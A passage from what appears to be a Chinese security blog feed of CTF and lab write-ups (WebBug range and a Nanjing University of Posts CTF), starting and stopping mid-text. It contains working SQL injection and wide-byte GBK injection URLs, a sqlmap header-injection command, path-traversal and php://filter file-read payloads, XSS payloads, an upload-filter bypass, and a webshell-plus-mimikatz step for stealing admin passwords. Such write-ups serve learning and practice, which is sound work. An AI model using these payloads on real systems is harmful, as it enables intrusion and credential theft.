–dump</p><p>得到flag:204f704fbbcf6acf398ffee11989b377</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-4.png" alt="img"></p><p>解法二：手工进行注入</p><p>1）先通过order by 子句判断有几个字段。</p><p><a href="http://172.16.193.128" target="_blank" rel="external">http://172.16.193.128</a>/pentest/test/sqli/sqltamp.php?gid=1’ order by 1 –+</p><p>当order by 后加数字为5的时候报错因而判断有4个表</p><p>2）爆数据库</p><p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1</a>‘ UNION SELECT 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() –+</p><p>3）爆表名</p><p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1</a>‘ UNION SELECT 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 –+</p><p>4）爆列名</p><p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1</a>‘ UNION SELECT 1,2,3,group_concat(id,0x5e,flag) from flag –+</p><p>参考：</p><p><a href="http://www.freebuf.com/articles/web/29942.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/29942.html</a></p><p><a href="http://www.cnblogs.com/zlgxzswjy/p/6707433.html" target="_blank" rel="external">http://www.cnblogs.com/zlgxzswjy/p/6707433.html</a></p><p>####从图片中你能找到什么？</p><p>1）首先从网站下载这个图片，之后你可以选择用winhex（windows平台使用）分析或者使用binwalk（linux平台）来分析，这里使用binwalk</p><p>2）先看看文件的构成，可以看到是有一个rar格式的文件在里面的</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-5.png" alt="img"></p><p>3）分离文件（当然你把文件后缀修改为rar也是可以的）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-6.png" alt="img"></p><p>4）直接看123.txt的内容是：密码是123。之后post这个密码就好</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-7.png" alt="img"></p><p>他题没有出好，咱们的思路是没有问题的。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-8.png" alt="img"></p><p>####你看到了什么？</p><p>1）题目不明确的时候就看源码，源码注释部分有扫目录的提示</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-9.png" alt="img"></p><p>2）使用工具扫描目录</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-10.png" alt="img"></p><p>其实这里存在一个小技巧，如果对方没有设置好apache的话会出现列目录的情况，这往往会泄露信息</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-11.png" alt="img"></p><p>3）看一眼诡异的test</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-12.png" alt="img"></p><p>4）然后就解答了</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-13.png" alt="img"></p><p>####告诉你了FLANG是5位数</p><p>1）分析：先看源码无提示；再考虑注册等功能发现无解；最后考虑爆破</p><p>2）爆破无验证码所以使用burpsuite（此处示例使用）或者AWVS等工具均可，若有验证码则要考虑自己编写脚本。最后可以发现爆破结果为admin：admin123</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-14.png" alt="img"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-15.png" alt="img"></p><p>3）登录发现没有flag（其实也是题目的问题，我们阅读源码即可发现）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-16.png" alt="img"></p><p>####一个优点小小的特殊的注入</p><p>1）提示头注入，所以直接使用sqlmap进行注入，首先burp抓包然后保存在sqlmap中</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-17.png" alt="img"></p><p>2）分析：头注入可能出现的几个位置：X-Forwarded-For、User-agent、Referer、Cookie。此处没有出现X-Forwarded-For所以我将其加上先进行这个点的测试。运气不错直接报错。接下来进行注入，与第一题的手工注入过程类似进行注入即可，或者使用sqlmap进行注入（注入命令为：python .\sqlmap.py -r .\test.txt -p “X-Forwarded-For”   text.txt文件的内容为你抓的包）。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-18.png" alt="img"></p><p>最后成功注入得到flag</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-19.png" alt="img"></p><p>注释：其实你手里是有源代码的，源码看下从白盒角度分析你就可以得到tips在哪儿。这里是基础代码审计不过多解释(代码审计可以借助一些工具的比如我最喜欢的cobra)。</p><p>一下是使用cobra检测的结果：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-22%20%E4%B8%8B%E5%8D%888.44.47.png" alt="img"></p><p>####这关需要RMB购买哦</p><p>1）点开可以看到只有一个登陆框，查看源代码看是否有tips,</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/12017-10-22%20%E4%B8%8B%E5%8D%888.51.55.png" alt="屏幕快照 2017-10-22 下午8.51.55"></p><p>果真是有提示的：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/22017-10-22%20%E4%B8%8B%E5%8D%889.02.58.png" alt="屏幕快照 2017-10-22 下午9.02.58"></p><p>2）跟着提示走，猜测是否可能为注入，但是当我访问链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://172.16.188.129/pentest/test/2/index.php?url=123</div></pre></td></tr></table></figure><p>却出现了弹出并显示成功跳转，没啥用，还是看下账号密码吧，第一题注入也可以看到这个账号密码。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/32017-10-22%20%E4%B8%8B%E5%8D%889.05.03.png" alt="屏幕快照 2017-10-22 下午9.05.03"></p><p>3）账号：密码&gt;&gt;&gt;tom:123456登陆抓包可以控制金额进行买卖</p><p>####越权</p><p>1）让修改密码所以目标就很明确了，我要越权修改别人的密码</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/42017-10-22%20%E4%B8%8B%E5%8D%8810.11.33.png" alt="屏幕快照 2017-10-22 下午10.11.33"></p><p>8.csrf</p><p>题目已经提示了是csrf所以我门使用burpsuite抓包然后直接生成PoC即可。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/52017-10-24%20%E4%B8%8A%E5%8D%8810.39.23.png" alt="屏幕快照 2017-10-24 上午10.39.23"></p><p>我们可以来测试一下效果：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/62017-10-24%20%E4%B8%8A%E5%8D%8810.42.42.png" alt="屏幕快照 2017-10-24 上午10.42.42"></p><p>首先我们访问我们的PoC</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/72017-10-24%20%E4%B8%8A%E5%8D%8810.42.57.png" alt="屏幕快照 2017-10-24 上午10.42.57"></p><p>之后点击submit便可以看到提示修改密码成功：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/82017-10-24%20%E4%B8%8A%E5%8D%8810.43.04.png" alt="屏幕快照 2017-10-24 上午10.43.04"></p><p>####URL跳转</p><p>看到题目的提示我突然想到前面在源码中看到的一个提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;index.php?url=#&quot;&gt;I&lt;/a&gt;</div></pre></td></tr></table></figure><p>从这里顿时想到了跳转的原理，所以我们只需要这样做就可以访问百度了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">172.16.188.129/pentest/test/5/index.php?url=https://www.baidu.com/</div></pre></td></tr></table></figure><p>####文件下载</p><p>直接访问发现是404，感觉有问题，还以为是要扫描发现某些文件，但发现不是，便去服务器看了下题目源码：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/92017-10-24%20%E4%B8%8A%E5%8D%8810.54.40.png" alt="屏幕快照 2017-10-24 上午10.54.40"></p><p>可以看到这个index.php是有问题的，所以我们直接看download.php即可</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/102017-10-24%20%E4%B8%8A%E5%8D%8810.59.28.png" alt="屏幕快照 2017-10-24 上午10.59.28"></p><p>觉得没有方向的话还是先看源码或者抓包看有没有提示，很巧在源码中我们可以看到有个tips：帮管理员找回mysql帐号密码。通过文件下载找管理员密码，那么可以判断此处应该是任意文件下载漏洞。而要找到管理员的密码我们肯定是要先下载数据库配置文件之后看情况来判断是否需要下载数据库文件。通过之前那个题我们知道这个靶场的apache没有配置好导致文件路径泄漏的问题。所以我们来手动翻一翻。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/112017-10-24%20%E4%B8%8A%E5%8D%8811.08.29.png" alt="屏幕快照 2017-10-24 上午11.08.29"></p><p>发现data这个路径下什么都没有，所以是不是可能存在一个跟data同级的目录（其实刚才看源码我都看到了）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/122017-10-24%20%E4%B8%8A%E5%8D%8811.10.34.png" alt="屏幕快照 2017-10-24 上午11.10.34"></p><p>成功发现config.php，之后我们构造PoC进行下载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://172.16.188.129/pentest//test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php</div></pre></td></tr></table></figure><p>之后打开就可以找到密码了，并不需要进一步对数据库做什么。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/132017-10-24%20%E4%B8%8A%E5%8D%8811.13.29.png" alt="屏幕快照 2017-10-24 上午11.13.29"></p><p>####我和上题有点像</p><p>这个和上面几乎一样，只不过参数的提交方式变了而已，我们用burp抓包然后修改pic参数即可。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/12017-10-24%20%E4%B8%8A%E5%8D%8811.54.08.png" alt="屏幕快照 2017-10-24 上午11.54.08"></p><p>####我系统密码忘记了</p><p>1）使用账号密码：tom；123456进行登录，登录后发现可以上传文件，所以便尝试上传webshell</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/22017-10-24%20%E4%B8%8B%E5%8D%8812.00.24.png" alt="屏幕快照 2017-10-24 下午12.00.24"></p><p>2）发现没有任何过滤，所以之后使用cknife进行连接</p><p>3）上传mimikatz抓取管理员密码即可</p><p>####xss</p><p>无任何过滤的一个反射型xss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://172.16.188.129/pentest/test/9/?id=%3Cscript%3Ealert(%27npusec%27)%3C/script%3E</div></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/32017-10-24%20%E4%B8%8B%E5%8D%8812.12.35.png" alt="屏幕快照 2017-10-24 下午12.12.35"></p><p>####存储型xss</p><p>也是不存在任何的过滤，只需要在留言处填写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(/npusec/)&lt;/script&gt;</div></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/42017-10-24%20%E4%B8%8B%E5%8D%8812.16.02.png" alt="屏幕快照 2017-10-24 下午12.16.02"></p><p>####什么？图片上传不了？</p><p>1）上传一张图片</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/62017-10-24%20%E4%B8%8B%E5%8D%883.05.40.png" alt="屏幕快照 2017-10-24 下午3.05.40"></p><p>2）上传php脚本</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/72017-10-24%20%E4%B8%8B%E5%8D%883.05.56.png" alt="屏幕快照 2017-10-24 下午3.05.56"></p><p>3）不能是图片还不能是脚本，我们看下处理的逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(strstr($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>],<span class="string">"image"</span>)&amp;&amp;strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"php"</span>))&#123;</div><div class="line"> </div><div class="line"> <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</div><div class="line">    <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"png"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"jpg"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"jpeg"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"bmp"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"gif"</span>))&#123;</div><div class="line"> <span class="keyword">echo</span> <span class="string">"&lt;font color='red'&gt;你真的上传了图片,可是这张图片我不喜欢,能换张吗?&lt;/font&gt;"</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"> <span class="keyword">echo</span> <span class="string">"&lt;font color='blue'&gt;你居然不上传图片,宝宝怒了!!&lt;/font&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;"</span>;</div></pre></td></tr></table></figure><p>4）根据代码来判断文件的type要为image、其次文件name要有php：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/82017-10-24%20%E4%B8%8B%E5%8D%883.14.16.png" alt="屏幕快照 2017-10-24 下午3.14.16"></p><p>####明天双十一</p><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(strstr($url,<span class="string">"www.taobao.com"</span>))&#123;</div><div class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_HOST'</span>]==<span class="string">"10.10.10.10"</span>)&#123;</div><div class="line"><span class="keyword">if</span>(strstr($_SERVER[<span class="string">'HTTP_REFERER'</span>],<span class="string">"www.baidu.com"</span>))&#123;</div><div class="line"><span class="keyword">if</span>(strstr($_SERVER[<span class="string">'HTTP_REFERER'</span>],<span class="string">"www.baidu.com"</span>))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"剁手了，请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"不想剁手了"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">&#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"nono"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">&#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"哎呀，这里只允许10.10.10.10访问！！！"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">&#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"这个地方剁手不好，换个地方！"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>一目了然，只需要将几个关键地方设置正确即可：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/52017-10-24%20%E4%B8%8B%E5%8D%883.01.40.png" alt="屏幕快照 2017-10-24 下午3.01.40"></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>南京邮电CTF题解</title>
      <link href="/2017/10/24/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5CTF%E9%A2%98%E8%A7%A3/"/>
      <url>/2017/10/24/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5CTF%E9%A2%98%E8%A7%A3/</url>
      <content type="html"><![CDATA[<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>nctf{flag_admiaanaaaaaaaaaaa}</p><h4 id="php的弱类型加MD5碰撞"><a href="#php的弱类型加MD5碰撞" class="headerlink" title="php的弱类型加MD5碰撞"></a>php的弱类型加MD5碰撞</h4><p>首先考察post提交数据，然后考察md5碰撞，MD5加密QNKCDZ0可以看到是0exxxxxxxxx之类的字符，你只需要找到一个字符串，md5加密后是0e开头就好了。例如： aabg7XSs</p><p>flag nctf{md5_collision_is_easy}</p><h4 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h4><p>考察html中的一些知识，在此直接用开发者工具修改即可</p><p>nctf{follow_me_to_exploit}</p><h4 id="基本图片隐写术"><a href="#基本图片隐写术" class="headerlink" title="基本图片隐写术"></a>基本图片隐写术</h4><p>macos下类似winhex的软件有<a href="http://ridiculousfish.com/hexfiend/" target="_blank" rel="external">http://ridiculousfish.com/hexfiend/</a></p><p>nctf{photo_can_also_hid3_msg}</p><h4 id="源码分析进阶"><a href="#源码分析进阶" class="headerlink" title="源码分析进阶"></a>源码分析进阶</h4><p>访问连接，没看出端倪，直接用burpsuite的spider模块爬了一下，结果发现404.html，访问之后查看源代码，进而发现端倪。</p><p>nctf{this_is_a_fl4g}</p><h4 id="js的AAencode"><a href="#js的AAencode" class="headerlink" title="js的AAencode"></a>js的AAencode</h4><p>其实已经提示是AAencode了，想办法解密就行。比如你可以再<a href="http://tool.isex.ren/aadecode" target="_blank" rel="external">http://tool.isex.ren/aadecode</a>这个网站进行解密。机密结果就是flag（有人说浏览器打开是乱码，这样的话你wget下载，然后记事本打开就行）</p><p>alert(“nctf{javascript_aaencode}”)</p><h4 id="单身拼手速"><a href="#单身拼手速" class="headerlink" title="单身拼手速"></a>单身拼手速</h4><p>我觉得是题目没有出好，我直接在burpsuite中抓包就看到了flag</p><p>当然也可能是出好了，考察的就是跳转</p><p>nctf{yougotit_script_now}</p><h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h4><p>一看就知道是改referer，因为在http头中来源地就是这个参数，在hackbar中修改了就行。</p><p>nctf{http_referer}</p><h4 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?phpfunction CLsI($ZzvSWE) &#123;    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);    &#125;    return $ZzvSWE;&#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt;</div></pre></td></tr></table></figure><p>修改为如下代码，运行即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">function CLsI($ZzvSWE) &#123;</div><div class="line"></div><div class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</div><div class="line"></div><div class="line">    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;</div><div class="line"></div><div class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return $ZzvSWE;</div><div class="line"></div><div class="line">&#125;echo(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt;</div></pre></td></tr></table></figure><p>其实我觉得这个不是在考代码审计，因为你echo一下就有flag了。但是还是说下这个解密。具体参考这个文章<a href="https://www.waitalone.cn/eval-gzinflate-base64_decode-decryption.html" target="_blank" rel="external">https://www.waitalone.cn/eval-gzinflate-base64_decode-decryption.html</a></p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>参考如下文章，构造<a href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php" target="_blank" rel="external">http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php</a></p><p><a href="http://www.2cto.com/article/201311/258420.html" target="_blank" rel="external">http://www.2cto.com/article/201311/258420.html</a></p><p>实在不会我们还有工具：<a href="https://github.com/D35m0nd142/LFISuite" target="_blank" rel="external">https://github.com/D35m0nd142/LFISuite</a></p><h4 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h4><p>考察302跳转：<a href="http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html</a></p><p>做题用burp抓包放repeater就行，其实用curl也可以</p><p>例如我用curl命令来做一下，其实这个源码也很好猜的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">➜  ~ curl -i http://chinalover.sinaapp.com/web9/index.php</div><div class="line"></div><div class="line">HTTP/1.1 302 Found</div><div class="line"></div><div class="line">Server: sae</div><div class="line"></div><div class="line">Date: Mon, 11 Sep 2017 08:29:53 GMT</div><div class="line"></div><div class="line">Content-Type: text/html</div><div class="line"></div><div class="line">Content-Length: 0</div><div class="line"></div><div class="line">Connection: keep-alive</div><div class="line"></div><div class="line">flag: nctf&#123;this_is302redirect&#125;</div><div class="line"></div><div class="line">Location: http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php</div><div class="line"></div><div class="line">Via: 1566</div></pre></td></tr></table></figure><h4 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a>Download~!</h4><p>提示了文件下载，可以联想到任意文件下载漏洞，这样的话我们可以顺利的下载网站的源码进行审计的。我们先下载download.php（文件名是base64编码的），之后我们可以看到还有一个hereiskey.php，继续下载即可得到flag:nctf{download_any_file_666}</p><p>download.php的源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">error_reporting(0);</div><div class="line"></div><div class="line">include(&quot;hereiskey.php&quot;);</div><div class="line"></div><div class="line">$url=base64decode($GET[url]);</div><div class="line"></div><div class="line">if( $url==&quot;hereiskey.php&quot; || $url==&quot;buxiangzhangda.mp3&quot; || $url==&quot;xingxingdiandeng.mp3&quot; || $url==&quot;download.php&quot;)&#123;</div><div class="line"></div><div class="line">$file_size = filesize($url);</div><div class="line"></div><div class="line">header ( &quot;Pragma: public&quot; );</div><div class="line"></div><div class="line">header ( &quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot; );</div><div class="line"></div><div class="line">header ( &quot;Cache-Control: private&quot;, false );</div><div class="line"></div><div class="line">header ( &quot;Content-Transfer-Encoding: binary&quot; );</div><div class="line"></div><div class="line">header ( &quot;Content-Type:audio/mpeg MP3&quot;);</div><div class="line"></div><div class="line">header ( &quot;Content-Length: &quot; . $file_size);</div><div class="line"></div><div class="line">header ( &quot;Content-Disposition: attachment; filename=&quot;.$url);</div><div class="line"></div><div class="line">echo(file_get_contents($url));</div><div class="line"></div><div class="line">exit;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">else &#123;</div><div class="line"></div><div class="line">echo &quot;Access Forbidden!&quot;;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure><h4 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h4><p>看到提示0==not，果断抓包把0改成1，然后就有了flag</p><p>flag:nctf{cookie_is_different_from_session}</p><h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4><p>提示让看robots.txt</p><p>然后看到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?phpif($GET[id]) &#123;   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);  mysql_select_db(SAE_MYSQL_DB);  $id = intval($GET[id]);  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;));  if ($_GET[id]==1024) &#123;      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;  &#125;  else&#123;    echo($query[content]);  &#125;&#125;?&gt;</div></pre></td></tr></table></figure><p>其实在此处是考察mysql中的一个精度问题，比如2014.1虽然在php中哦按段不等于2014，但是再查询时，加入mysql设置id为整型，那么2014.1就会变成2014。</p><p>the flag is:nctf{query_in_mysql}</p><h4 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h4><p>其实看到连接就知道是gbk的问题了，后面提示也有</p><p>your sql:select id,title from news where id = ‘2’</p><p>gbk_sql_injection</p><p>关于宽字节注入问题可以看这个文章：</p><p><a href="http://www.91ri.org/8611.html" target="_blank" rel="external">http://www.91ri.org/8611.html</a></p><p><a href="https://www.2cto.com/article/201301/182881.html" target="_blank" rel="external">https://www.2cto.com/article/201301/182881.html</a></p><p>你可以手动来做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=ß&apos; union select 1,database() #</div></pre></td></tr></table></figure><p>your sql:select id,title from news where id = ‘運’ union select 1,database() #’</p><p>sae-chinalover</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23</div></pre></td></tr></table></figure><p>your sql:select id,title from news where id = ‘id=運’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #’</p><p>ctf,ctf2,ctf3,ctf4,news</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 %23</div></pre></td></tr></table></figure><p>your sql:select id,title from news where id = ‘運’ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 #’</p><p>id,flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(id,0x3a,flag) from ctf4 %23</div></pre></td></tr></table></figure><p>your sql:select id,title from news where id = ‘運’ union select 1,group_concat(id,0x3a,flag) from ctf4 #’</p><p>1:nctf{gbk_3sqli}</p><h4 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h4><p>看标题就知道这个是在考察00截断</p><p>分析下这段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (isset ($GET[&apos;nctf&apos;])) &#123;        if (@ereg (&quot;^[1-9]+$&quot;, $GET[&apos;nctf&apos;]) === FALSE)            echo 